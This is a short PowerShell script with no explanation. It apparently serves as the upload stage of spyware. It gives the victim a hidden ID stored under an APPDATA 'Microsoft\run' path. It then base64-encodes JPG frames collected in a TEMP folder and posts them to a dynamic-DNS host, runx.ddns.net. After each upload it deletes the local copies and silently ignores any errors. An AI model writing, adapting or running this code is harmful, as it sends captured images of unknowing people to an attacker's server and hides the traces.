$VPS_UPLOAD_URL = "http://runx.ddns.net/api/upload"

# Create ID
$IdPath = "$env:APPDATA\Microsoft\run\run.txt"
if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()
  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
}
$uniqueUser = "$($env:USERNAME)-$uniqueId-W"

$framesRepoDir = Join-Path $env:TEMP "frames-repo"
$userDir = Join-Path $framesRepoDir $uniqueUser

if (Test-Path $userDir) {
  $jpgs = Get-ChildItem -Path $userDir -Filter *.jpg
  foreach ($jpg in $jpgs) {
    try {
      $fileBytes = [System.IO.File]::ReadAllBytes($jpg.FullName)
      $base64Image = [Convert]::ToBase64String($fileBytes)

      $body = @{
        username = $uniqueUser
        filename = $jpg.Name
        image = $base64Image
      } | ConvertTo-Json -Compress

      Invoke-RestMethod -Method Post -Uri $VPS_UPLOAD_URL -ContentType "application/json" -Body $body -TimeoutSec 15 | Out-Null

      # Clean up local copy after successful upload
      Remove-Item $jpg.FullName -Force
    }
    catch {}
  }
}
